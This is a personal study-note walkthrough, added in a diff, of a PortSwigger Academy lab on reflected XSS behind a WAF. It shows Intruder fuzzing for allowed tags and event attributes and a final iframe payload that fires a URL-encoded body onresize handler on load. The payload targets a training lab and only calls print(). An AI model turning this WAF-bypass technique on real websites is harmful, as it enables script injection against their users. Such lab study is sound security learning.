@@ -1,0 +1,56 @@
+---
+title: Reflected XSS into HTML context with most tags and attributes blocked
+date: '2025-06-18'
+tags:
+  - PortSwigger
+  - lab
+  - xss
+  - walkthrough
+excerpt: >-
+  This lab contains a reflected XSS vulnerability in the search functionality
+  but uses a web application firewall (WAF) to protect against common XSS
+  vectors.
+type: lab
+category: PortSwigger Academy
+platform: PortSwigger
+difficulty: apprentice
+---
+# Lab: Reflected XSS into HTML context with most tags and attributes blocked
+
+## Objective
+This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.
+To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the `print()` function.
+> **Note:** Your solution must not require any user interaction. Manually causing `print()` to be called in your own browser will not solve the lab.
+
+## Why This Works (The Principle)
+- **The vulnerability:** User-supplied input is embedded into a web page without proper escaping, allowing arbitrary JavaScript execution.
+- **Root cause:** The application outputs attacker-controlled data into an HTML context, attribute, or JavaScript context without sanitization.
+- **Exploitation:** Inject a payload that escapes the current context (e.g., `>` to break out of an HTML tag, `"` to break out of an attribute).
+- **Key insight:** XSS is context-dependent — the same payload will not work in every injection point. Always identify the context first.
+
+## Blind Attempt (15-20 min max)
+*Try without any hints. Document everything.*
+- **What I tried:**
+- **Where I got stuck:**
+
+## Hint Usage (if needed)
+- [ ] Used lab hint
+- [x] Watched video solution
+- *Resume blind with new clue. Still stuck?*
+
+## Solution Reconstruction
+*After viewing full solution, close it immediately.*
+- [ ] Step 1: Used intruder on html tag to see which tag is not getting blocked by WAF like:  `/?search=<$body$ onresize="print()">` 
+- [ ] Step 2: Used intruder again on html action to see which action attribute is valid and not getting 400 error like:  `/?search=<body $onresize$="print()">` 
+- [ ] Step 3: Since the user was not going to perform any action we had to automate the process so, we enclosed the entire payload in an `<iframe>` and made the size of the iframe's width resize when the iframe loads with the payload below: 
+- [ ] Final payload / exploit: 
+```js
+<iframe src="https://0ae9008c03c4eb2e8015f49800f10030.web-security-academy.net/?search=%3c%62%6f%64%79%20%6f%6e%72%65%73%69%7a%65%3d%22%70%72%69%6e%74%28%29%22%3e" onload=this.style.width="100px"></iframe>
+```
+
+## Key Takeaway
+Very cool XSS payloads found here: [Portswigger XSS Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+
+## Next-Day Blind Replay
+- [ ] Solved entirely from memory
+- [ ] Needed to look at: *(write the specific step forgotten)*
